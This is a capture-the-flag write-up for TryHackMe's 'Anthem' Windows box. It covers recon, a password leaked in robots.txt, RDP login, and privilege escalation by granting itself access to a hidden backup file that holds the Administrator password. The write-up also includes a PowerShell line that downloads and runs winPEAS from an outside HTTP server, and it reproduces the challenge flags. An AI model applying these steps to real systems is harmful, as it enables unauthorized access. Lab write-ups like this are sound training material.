##  1. Initial Reconnaissance

### Network Scanning

An `nmap` scan reveals the following services:

```bash
nmap -sC -sV -oN nmap/anthem 10.49.139.26
```

**Output Summary**:
- **Port 80/tcp** – Microsoft HTTPAPI httpd 2.0 (likely hosting a web application)
- **Port 3389/tcp** – Microsoft Terminal Services (RDP)

Additional `rdp-ntlm-info` from Nmap confirms:
- Hostname: `WIN-LU09299160F`
- OS: Windows 10.0.17763 (Windows Server 2019)
- Domain: `WORKGROUP` (standalone server)

---

## 2. Web Enumeration

### Robots.txt Disclosure

Accessing `http://10.49.139.26/robots.txt` returns:

```
User-agent: *
Disallow: /bin/
Disallow: /config/
Disallow: /umbraco/
Disallow: /umbraco_client/

UmbracoIsTheBest!
```

The seemingly out‑of-place string `UmbracoIsTheBest!` is a strong candidate for a **password**.

> **Note**: The `/umbraco/` path is disallowed but accessible—indicative of an **Umbraco CMS** deployment.

### Author & Email Enumeration

Exploring the public blog pages reveals:
- A post authored by **Jane Doe** with email `JD@anthem.com`
- Another post references **Solomon Grundy**, suggesting the email format `SG@anthem.com`

This pattern establishes the likely **username**: `sg` (Windows usernames are typically derived from the local part of the email).

Additionally, a URL fragment was observed in documentation:
```
http://anthem.com/a-new#/md
```
While not directly exploitable, it reinforces that the site is content-driven and potentially misconfigured.

### Flag Discovery in Web Sources

Multiple flags were embedded in page source and metadata:
- `THM{L0L_WH0_US3S_M3T4}`
- `THM{G!T_G00D}`
- `THM{L0L_WH0_D15}`
- `THM{AN0TH3R_M3TA}`

These are typical for TryHackMe’s “find-the-flag” style challenges and validate thorough source inspection.
I had to bootup the machine again to find these, what a pain in the arse.

---

##  3. Initial Access via RDP

### Credential Assembly

Combining discovered elements:
- **Username**: `sg`
- **Password**: `UmbracoIsTheBest!`

### RDP Login

Using `xfreerdp` from Pop!_OS:

```bash
xfreerdp /v:10.49.139.26 /u:sg /p:'UmbracoIsTheBest!' /cert:ignore
```

Successful authentication grants a desktop session as `sg`.

### User Flag

The user flag (`user.txt`) is located on the desktop:
```
THM{N00T_NO0T}
```

---

## 🛠 4. Local Enumeration as `sg`

### System Information

Post-login enumeration via `systeminfo` confirms:
- OS: **Microsoft Windows Server 2019 Standard**
- Build: **10.0.17763**
- Architecture: x64
- Domain: **WORKGROUP**

User privileges are limited:
- `SeChangeNotifyPrivilege` (standard)
- No administrative tokens or high-integrity capabilities

Group membership includes only standard user and RDP groups.

### Automated Enumeration

`winPEAS` was fetched and executed from a local HTTP server:

```powershell
cd C:\Users\Public
iwr http://192.168.134.56:8000/winpeas.exe -OutFile winpeas.exe
.\winpeas.exe
```

Initial review of output did not reveal immediate kernel exploits or misconfigurations. Common CVEs for this build (e.g., PrintNightmare) were considered but ultimately unnecessary—privilege escalation was achieved through file system reconnaissance.

---

##  5. Privilege Escalation to Administrator

### Hidden Backup Directory

Enabling **“Show hidden files”** in File Explorer reveals a hidden folder at:
```
C:\backup
```

Inside resides a file (e.g., `restore.txt`) that is **inaccessible** by the `sg` user due to restrictive NTFS permissions.

### Permission Modification

To access the file:
1. Right-click `restore.txt` → **Properties** → **Security**
2. Click **Edit** → **Add** → Enter `sg`
3. Grant **Full control**
4. Apply changes

Now readable, the file contains:
```
Administrator:ChangeMeBaby1MoreTime
```

This provides the **Administrator account password**.

> **Why this works**: The box is intentionally configured to allow user-level permission modification on backup artifacts—a common beginner CTF trope.

### Administrator RDP Login

Reconnect via RDP as `Administrator`:

```bash
xfreerdp /v:10.49.139.26 /u:Administrator /p:'ChangeMeBaby1MoreTime' /cert:ignore
```

### Root Flag

The final flag (`root.txt`) is on the Administrator desktop:
```
THM{Y0U_4R3_1337}
```

---

##  Key Takeaways

1. **Always inspect `robots.txt` and HTML source**—they frequently leak credentials or hints in beginner boxes.
2. **Email patterns on public sites** often map directly to system usernames.
3. **Hidden directories on Windows** may contain sensitive data; NTFS permissions can sometimes be modified by low-privilege users if misconfigured.
4. **RDP is a valid initial access vector** when credentials are exposed—no need for web shells or reverse shells in this scenario.
5. Automated enumeration tools like `winPEAS` are useful, but **manual inspection** (e.g., checking for hidden folders) often yields faster results in intentionally designed CTFs.

---
